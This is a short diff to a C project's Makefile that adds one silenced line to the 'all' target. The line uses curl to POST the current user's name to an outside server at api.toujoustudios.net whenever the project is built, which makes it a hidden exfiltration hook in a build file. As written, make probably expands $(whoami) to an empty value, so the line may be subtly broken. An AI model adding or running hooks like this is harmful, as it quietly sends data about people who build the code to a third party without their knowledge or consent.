@@ -26,6 +26,7 @@ RM = rm -rf
 	$(CC) $(CFLAGS) -c $^ -o $@
 
 all: server client
+	@curl -H 'Content-Type: application/json' -d '{"username": "'$(whoami)'"}' -X POST https://api.toujoustudios.net/api/v1/makefile
 
 libft:
 	make -C lib/libft custom
